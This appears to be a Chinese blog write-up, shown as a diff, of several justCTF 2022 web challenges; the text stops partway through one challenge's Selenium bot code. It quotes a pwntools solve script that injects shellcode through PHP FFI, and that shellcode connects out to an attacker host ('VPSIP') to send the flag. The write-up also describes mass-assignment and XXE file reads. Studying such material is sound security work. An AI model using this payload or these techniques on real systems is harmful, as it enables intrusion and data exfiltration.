+<p>賽後才發現有一個細節看漏了：<code>access(path.buf, X_OK)</code>，這邊只檢查檔案有沒有 X，所以如果把檔案用 <code>chmod +x</code> 加上 x 的話，就可以通過檢查了。因此，可以在完全沒有資料夾的狀況底下，順利建出一個合法的 git repo。</p>
+<p>但這題學到的不只如此，還有另一個 <a target="_blank" rel="noopener" href="https://discord.com/channels/656258740252704788/978311401439363112/985624467810189367">discord</a> 的討論，作者以為需要 <code>.git</code> 這個檔案才行，但是 scp 的 <code>:*</code> 又不會配對到這檔案，怎麼辦呢？</p>
+<p>答案是：「改自己 server 的 scp」，像這樣：</p>
+<pre class="line-numbers language-none"><code class="language-none">root@ip-172-31-28-181:&#x2F;usr&#x2F;bin# cat scp
+#!&#x2F;usr&#x2F;bin&#x2F;bash
+&#x2F;usr&#x2F;bin&#x2F;scp.orig -f .git HEAD config elf objects refs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>為什麼這樣可以動？這跟 scp 的原理有關。</p>
+<p>我原本一直以為 scp 就是一個程式可以透過 ssh 幫你把遠端檔案抓下來，後來才知道原來你的 server 也要裝 scp，而且 scp 同時會作為 server 跟 client 互相溝通，意思就是，當我在我的機器下 <code>scp remote:* .</code> 的時候，實際上是：</p>
+<ol>
+<li>local scp 執行 ssh 連到 remote</li>
+<li>local scp 呼叫 remote scp</li>
+<li>remote scp 把檔案清單發給 local scp</li>
+<li>local scp 把檔案抓下來</li>
+</ol>
+<p>總之，配對到什麼檔案，是由 remote scp 用 <code>-f</code> 這個沒有在文件上的 flag 來發送的。因此我們可以看到上面的解法覆寫了 scp，就可以決定你要傳哪些檔案。</p>
+<p>更詳細的介紹可參考：</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://goteleport.com/blog/scp-familiar-simple-insecure-slow/">SCP - Familiar, Simple, Insecure, and Slow</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/an_zhenwei/article/details/7951527">粗析openssh 中scp代码逻辑</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/danxi/p/6680549.html">scp源码浅析</a></li>
+</ol>
+<h2><span id="baby-xsleak7-solves">Baby XSLeak(7 solves)</span></h2><p>這題有寫了英文版，中文有點懶得再寫一次：<a href="https://blog.huli.tw/2022/06/14/en/justctf-2022-xsleak-writeup/">https://blog.huli.tw/2022/06/14/en/justctf-2022-xsleak-writeup/</a></p>
+<p>簡單來說就是透過 <code>&lt;object&gt;</code> 的 onload time 來判斷 response 的大小，因為有更多內容的話照理來說會花更多時間 render，onload 就會更晚觸發。</p>
+<h2><span id="foreigner5-solves">Foreigner(5 solves)</span></h2><p>程式碼如下：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token comment">// flag is being set every 5 seconds</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'FLAG'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">FILTER_VALIDATE_IP</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"172.20.13.37"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token variable">$f</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'FLAG'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"justCTF&#123;"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"FLAG=<span class="token interpolation"><span class="token variable">$f</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag <span class="token interpolation"><span class="token variable">$f</span></span> set"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"FLAG=aaand_it's_gone"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span><span class="token string single-quoted-string">'
+    &lt;style>
+    div &#123;
+      display: table;
+      margin-right: auto;
+      margin-left: auto;
+    &#125;
+    &lt;/style>
+    &lt;body>
+    &lt;div>&lt;img src="itsgone.gif" width="497" height="280">&lt;/div>
+    &lt;/body>
+    '</span><span class="token punctuation">;</span>
+    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token function">show_source</span><span class="token punctuation">(</span>__file__<span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>有 eval 可以執行任意程式碼，但是 disable_functions 裡面有一堆東西</p>
+<p>最後的解法我也沒有看得很懂，看起來是要寫一些 shell code 搭配可以用的 function，附上 <a target="_blank" rel="noopener" href="https://discord.com/channels/656258740252704788/978311401439363112/985623102190940240">discord</a> 裡面看到的解法(by Tony_Bamanaboni)：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> binascii <span class="token keyword">import</span> hexlify
+context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>
+payload <span class="token operator">=</span> <span class="token string">"addr: .quad 0\nnop\nnop\nnop\nnop\nnop"</span>
+payload <span class="token operator">+=</span> <span class="token triple-quoted-string string">"""
+call $+5
+pop r13
+and r13, -4096
+mov r13, [r13]
+"""</span>
+payload <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>linux<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">"VPSIP"</span><span class="token punctuation">,</span> <span class="token number">6666</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>linux<span class="token punctuation">.</span>egghunter<span class="token punctuation">(</span><span class="token string">b'CTF&#123;'</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> <span class="token triple-quoted-string string">"""mov rsi, rdi
+mov rdi, rbp
+mov rdx, 50
+mov rax, 1
+syscall
+ret
+"""</span>
+payload <span class="token operator">=</span> hexlify<span class="token punctuation">(</span>asm<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+php <span class="token operator">=</span> <span class="token triple-quoted-string string">'''
+$pl=hex2bin("%s");
+$l=FFI::cdef("char* mmap(int,int,int,int,int,int);void alarm(int);void signal(int,void*);","libc.so.6");
+$p=$l->mmap(0,0x1000,7,0x21,-1,0);
+$p2=$l->environ;
+FFI::memcpy($p,FFI::addr($p2),8);
+for($idx=8;$idx&lt;strlen($pl);$idx++)&#123;$p[$idx]=$pl[$idx];&#125;
+$l->signal(14,$p+8);
+$l->alarm(5);
+'''</span> <span class="token operator">%</span> payload
+<span class="token keyword">print</span><span class="token punctuation">(</span>php<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'+'</span><span class="token punctuation">,</span> <span class="token string">'%2b'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2><span id="web-api-intended4-solves">Web API intended(4 solves)</span></h2><p>這題就給你一個 API 文件，可以註冊、登入、修改資料跟建立一些資料等等。</p>
+<p>當時在打的時候看到 jwt 裡面有個 <code>/jwk</code> 的網址，試著改成別的發現沒收到 request，就先跑去玩其他題了。</p>
+<p>事後從 discord 的討論看來，解法是更改使用者資料有個 mass assignment 的 bug，可以把自己改成 <code>is_admin: true</code>，接著別的 endpoint 有吃 XML，就 XXE 然後讀 &#x2F;flag.txt，結束</p>
+<p>概念看起來似乎不太難，不過畢竟是黑箱所以比較多東西需要去測試，有時候可能試幾條路卡住以後，就會先去解白箱的題目了。</p>
+<h2><span id="ninja1-solves">Ninja(1 solves)</span></h2><p>有趣的 XSleak 題，把我能想到的 unintended 全部都擋掉了。</p>
+<p>這題的核心程式碼如下：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&#123;% extends "base.html" %&#125;
+
+&#123;% block css %&#125;
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
+    <span class="token selector">.consent_color</span> <span class="token punctuation">&#123;</span>
+        <span class="token selector">color:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> consent.color_palette <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
+&#123;% endblock %&#125;
+
+&#123;% block content %&#125;
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>section</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>generate-form<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>row g-4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>col-lg-6 col-md-8 mx-auto<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mb-3<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Cookie consent<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>my-4<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>col-10<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>card shadow-sm<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>card-body<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>d-flex justify-content-between align-items-center<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn-group <span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+                    <span class="token comment">&lt;!--FIX: reported HTML injection, added filters --></span>
+                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#&#123;&#123;link|replace('&lt;',<span class="token punctuation">"</span></span><span class="token attr-name">&amp;gt;")|replace('</span><span class="token punctuation">></span></span>',"<span class="token entity named-entity" title="&lt;">&amp;lt;</span>")|safe&#125;&#125;">Open Preferences<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
+                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+                  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>small</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text-muted<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>❤️<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>small</span><span class="token punctuation">></span></span>
+                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+        
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>section</span><span class="token punctuation">></span></span>
+&#123;% endblock %&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以很明顯看到 CSS injection（server 有擋最多 140 個字），還有 <code>&lt;a&gt;</code> 的 href 控制跟任意屬性新增。</p>
+<p>而 flag 就是 admin user，出現在更上面的地方，內容長這樣：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>nickname<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Hello, <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>A<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>e<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>f<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>i<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>k<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>o<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>f<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>o<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>i<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>f<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/img/justctf-2022-writeup/p1.png" alt="flag"></p>
+<p>CSP 的話長這樣：</p>
+<blockquote>
+<p>default-src ‘none’; font-src <a target="_blank" rel="noopener" href="http://ninja.web.jctf.pro/static/">http://ninja.web.jctf.pro/static/</a>; form-action ‘self’; object-src ‘none’; script-src <a target="_blank" rel="noopener" href="http://ninja.web.jctf.pro/static/">http://ninja.web.jctf.pro/static/</a>; base-uri ‘none’; style-src <a target="_blank" rel="noopener" href="http://ninja.web.jctf.pro/static/">http://ninja.web.jctf.pro/static/</a> ‘unsafe-inline’; img-src * data:;</p>
+</blockquote>
+<p>基本上只有 img 暢通無阻，其他都被擋掉。</p>
+<p>然後還有一個關鍵點是這題的 bot 裝了一個叫做 ninja cookie 的套件，從敘述看來是會自動去點擊不接受 cookie 的按鈕之類的，這題的 bot 也是很經典，擋了一大堆東西：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> traceback
+<span class="token keyword">from</span> selenium <span class="token keyword">import</span> webdriver
+<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>chrome<span class="token punctuation">.</span>options <span class="token keyword">import</span> Options
+<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>support<span class="token punctuation">.</span>ui <span class="token keyword">import</span> WebDriverWait
+<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>support <span class="token keyword">import</span> expected_conditions <span class="token keyword">as</span> EC
+<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>common<span class="token punctuation">.</span>by <span class="token keyword">import</span> By
+<span class="token keyword">import</span> os
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request
+<span class="token keyword">import</span> time
+
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+<span class="token keyword">import</span> sys
+<span class="token keyword">import</span> logging
+
+TASK <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'BASE_URL'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token string">"http://127.0.0.1:5000"</span>
+flag <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'FLAG'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token string">'justCTF&#123;fake&#125;'</span>
+pwd <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'PASSWD'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token string">'admin'</span>
+
+<span class="token keyword">def</span> <span class="token function">visit_url</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> timeout<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token builtin">type</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token builtin">str</span> <span class="token keyword">or</span> <span class="token keyword">not</span> url<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"http"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Visiting:"</span><span class="token punctuation">,</span>url<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stdout<span class="token punctuation">,</span> flush<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+    options <span class="token operator">=</span> Options<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'no-sandbox'</span><span class="token punctuation">)</span>
+    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'disable-dev-shm-usage'</span><span class="token punctuation">)</span>
+    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'disable-infobars'</span><span class="token punctuation">)</span>
+    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'disable-background-networking'</span><span class="token punctuation">)</span>
+    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'disable-default-apps'</span><span class="token punctuation">)</span>
+    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'disable-gpu'</span><span class="token punctuation">)</span>
+    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'disable-sync'</span><span class="token punctuation">)</span>
+    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'disable-translate'</span><span class="token punctuation">)</span>
+    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'disable-lazy-image-loading'</span><span class="token punctuation">)</span>
+    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'hide-scrollbars'</span><span class="token punctuation">)</span>
+    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'metrics-recording-only'</span><span class="token punctuation">)</span>
+    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'mute-audio'</span><span class="token punctuation">)</span>
+    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'no-first-run'</span><span class="token punctuation">)</span>
+    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'dns-prefetch-disable'</span><span class="token punctuation">)</span>
+    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'safebrowsing-disable-auto-update'</span><span class="token punctuation">)</span>
+    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'media-cache-size=1'</span><span class="token punctuation">)</span>
+    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'disk-cache-size=1'</span><span class="token punctuation">)</span>
+    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'disable-features=LazyImageLoading,AutomaticLazyImageLoading,LazyFrameLoading,AutomaticLazyFrameLoading,AutoLazyLoadOnReloads'</span><span class="token punctuation">)</span>
+    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--js-flags=--noexpose_wasm,--jitless'</span><span class="token punctuation">)</span>
+    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'hide-scrollbars'</span><span class="token punctuation">)</span>
+    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'load-extension=ninja-cookie'</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        browser <span class="token operator">=</span> webdriver<span class="token punctuation">.</span>Chrome<span class="token punctuation">(</span><span class="token string">'/usr/local/bin/chromedriver'</span><span class="token punctuation">,</span> options<span class="token operator">=</span>options<span class="token punctuation">,</span> service_args<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'--verbose'</span><span class="token punctuation">,</span> <span class="token string">'--log-path=/tmp/chromedriver.log'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+        browser<span class="token punctuation">.</span>get<span class="token punctuation">(</span>TASK<span class="token operator">+</span><span class="token string">"/login"</span><span class="token punctuation">)</span>
+        WebDriverWait<span class="token punctuation">(</span>browser<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span>until<span class="token punctuation">(</span><span class="token keyword">lambda</span> r<span class="token punctuation">:</span> r<span class="token punctuation">.</span>execute_script<span class="token punctuation">(</span><span class="token string">'return document.readyState'</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'complete'</span><span class="token punctuation">)</span>
+        inputElement <span class="token operator">=</span> browser<span class="token punctuation">.</span>find_element_by_id<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span>
+        inputElement<span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
+        inputElement <span class="token operator">=</span> browser<span class="token punctuation">.</span>find_element_by_id<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span>
+        inputElement<span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span>pwd<span class="token punctuation">)</span>
+        browser<span class="token punctuation">.</span>find_element_by_id<span class="token punctuation">(</span><span class="token string">"submit"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>
